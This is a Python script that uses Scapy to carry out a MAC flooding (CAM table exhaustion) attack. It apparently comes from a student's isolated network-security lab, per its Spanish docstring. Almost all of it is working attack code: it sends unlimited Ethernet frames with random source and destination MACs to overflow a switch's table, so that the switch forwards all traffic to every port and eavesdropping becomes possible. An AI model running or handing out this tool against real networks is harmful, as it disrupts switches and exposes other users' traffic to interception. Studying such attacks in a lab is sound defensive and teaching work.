#!/usr/bin/env python3
"""
mac_flooding.py — CAM Table Exhaustion (MAC Flooding)
======================================================
Envía frames Ethernet con MACs de origen aleatorias para saturar
la tabla CAM del switch. Cuando la tabla se llena, el switch entra
en fail-open y reenvía frames a todos los puertos (modo hub).

Autor     : Julio Pujols — Matrícula: 20250692
Red       : 192.168.92.0/24
Requisitos: Python 3.6+ | Scapy >= 2.4.0 | root/sudo
[LAB]     : Uso exclusivo en entorno de laboratorio aislado.
"""

import argparse
import random
import signal
import sys
import time

from scapy.all import Ether, conf, sendp

_stats = {"sent": 0, "t0": 0.0}


def _sigint(sig, frame):
    t = time.time() - _stats["t0"]
    rate = _stats["sent"] / t if t > 0 else 0
    print(f"\n[!] Detenido — {_stats['sent']:,} frames | {rate:.0f} fps")
    sys.exit(0)


def _rand_mac() -> str:
    return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))


def main():
    parser = argparse.ArgumentParser(
        description="MAC Flooding — CAM table exhaustion"
    )
    parser.add_argument("-i", "--iface", required=True,
                        help="Interfaz de red (ej: eth0)")
    parser.add_argument("-c", "--count", type=int, default=0,
                        help="Frames a enviar (0 = infinito)")
    args = parser.parse_args()

    conf.verb = 0
    signal.signal(signal.SIGINT, _sigint)

    print(f"[*] MAC Flooding | iface={args.iface} "
          f"count={'∞' if not args.count else args.count}")
    print("[*] Ctrl+C para detener\n")

    _stats["t0"] = time.time()
    while True:
        # Src MAC aleatoria → nueva entrada en CAM por frame
        frame = Ether(src=_rand_mac(), dst=_rand_mac())
        sendp(frame, iface=args.iface, verbose=False)
        _stats["sent"] += 1

        if _stats["sent"] % 500 == 0:
            t = time.time() - _stats["t0"]
            print(f"\r[+] {_stats['sent']:,} frames | {_stats['sent']/t:.0f} fps",
                  end="", flush=True)

        if args.count and _stats["sent"] >= args.count:
            _sigint(None, None)


if __name__ == "__main__":
    main()
